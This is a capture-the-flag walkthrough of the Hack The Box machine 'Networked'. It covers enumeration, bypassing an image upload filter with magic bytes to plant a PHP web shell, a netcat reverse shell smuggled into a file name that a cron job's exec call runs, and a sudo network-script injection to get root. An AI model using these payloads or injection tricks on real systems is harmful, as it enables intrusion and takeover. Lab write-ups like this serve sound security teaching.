---
description: >-
  Interesting foothold with an obscure but easy to use privilege escalation
  vector.
---

# Networked

<figure><img src="../.gitbook/assets/Networked.png" alt=""><figcaption></figcaption></figure>

## Overview

Networked is an easy machine that involves some command injection and also a rare privilege escalation.

## Enumeration

### Nmap and Gobuster

```
┌──(kali㉿kali)-[~/htb/networked]
└─$ cat networked.nmap
...
Discovered open port 22/tcp on 10.10.10.146
Discovered open port 80/tcp on 10.10.10.146
...
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2275d7a74f81a7af5266e52744b1015b (RSA)
|   256 2d6328fca299c7d435b9459a4b38f9c8 (ECDSA)
|_  256 73cda05b84107da71c7c611df554cfc4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
...
```

Navigating to port 80 shows a webpage with some text on it but no outgoing links or files. Instead, I ran gobuster to see what directories there are. I added -x php to check php pages as well since the nmap scan shows the server is based on php.

```
┌──(kali㉿kali)-[~/htb/networked]
└─$ gobuster dir -u 10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o networked.gb
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/22 19:47:39 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 229]
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
/photos.php           (Status: 200) [Size: 1425]
/upload.php           (Status: 200) [Size: 169]
/lib.php              (Status: 200) [Size: 0]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
```

### HTTP

The upload.php webpage is pretty interesting. It's pretty simple, it lets us upload a file. I want to upload a php file, since we will probably be able to run it.&#x20;

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

The following code just creates a testcommand parameter and lets us edit it to execute that given command. To do this, I'll put it into burp suite and push it to repeater to make it a little easier to send multiple requests.

```
<?php system($_GET['testcommand']);?>
```

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

However, this is not going to be that easy. The server is going to validate our upload to make sure it's an image. This sounds impossible to bypass, but we can read the source code at the /backup directory.&#x20;

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Downloading this and unzipping it shows us a lot of php files. The most interesting one for now is upload.php.

```
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file</p>";
      displayform();
      exit;
    }
```

I see that we need to check the file type is valid and the file size is under 60K. Let's look at the file\_mime\_type() function in lib.php.

```
function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo))
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0)
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }
}
```

We can see here that the verification functions are just looking at the starting bytes, aka magic bytes. Therefore, if we just put some of these at the start of our php code, we can circumvent the filter. Also, we need to append an "image" extension to our upload, which the second step of verification. Doing both of these things gives us an "upload accepted" message.

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

We can find our upload at http://10.10.10.146/photos.php, which leads to the true location of http://10.10.10.146/uploads/10\_10\_14\_18.php.gif. By appending a ?testcommand=id to the end of the url, we can see that we run commands.&#x20;

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## User

I then wrote a quick bash reverse shell and opened up a netcat listener to get a reverse shell.

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Nice! We are the apache user, which means we sadly can't read user.txt, but we can go to the home directory of our single user guly. They've got some interesting files, namely a crontab and a php file.

```
┌──(kali㉿kali)-[~/htb/networked]
└─$ nc -lvnp 9001                 
listening on [any] 9001 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.146] 57742
bash: no job control in this shell
bash-4.2$ cd /home/guly
cd /home/guly
bash-4.2$ ls
ls
check_attack.php
crontab.guly
user.txt
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
bash-4.2$ cat check_attack.php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

This code is traversing all the files in /var/www/html/uploads and doing something to each file with the line -

```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

However, we can interrupt this with a semicolon and run a lot of things. However, we can't have any slashes in the command, so we'll use a netcat reverse shell instead.

To do this, we'll name a file ';nc -c bash 10.10.14.18 9001;.php' in the /var/www/html/uploads and wait for the crontab to activate. I'll open up another netcat listener and wait for the shell.

```
┌──(kali㉿kali)-[~/htb/networked]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.146] 57612
ls
check_attack.php
crontab.guly
user.txt
whoami
guly
python -c 'import pty;pty.spawn("/bin/bash")'
[guly@networked ~]$ ^Z
zsh: suspended  nc -lvnp 9001

┌──(kali㉿kali)-[~/htb/networked]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9001

[guly@networked ~]$ whoami
guly
[guly@networked ~]$ cd
[guly@networked ~]$ ls -ltr
total 12
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-r--------. 1 guly guly  33 Jan 23 00:46 user.txt
[guly@networked ~]$ cat user.txt
REDACTED
```

## Privilege Escalation

```
[guly@networked ~]$ sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Looks like we've got a script we can run as sudo.

```
[guly@networked ~]$ cat /usr/local/sbin/changename.sh 
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

This is a network configuration script, which has a convenient vulnerability where you can run arbitrary code by adding a space. You can read more about it at [https://seclists.org/fulldisclosure/2019/Apr/24](https://seclists.org/fulldisclosure/2019/Apr/24)

```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
foo
interface PROXY_METHOD:
foo
interface BROWSER_ONLY:
foo bash
interface BOOTPROTO:
foo
[root@networked network-scripts]# 
```

Completed.

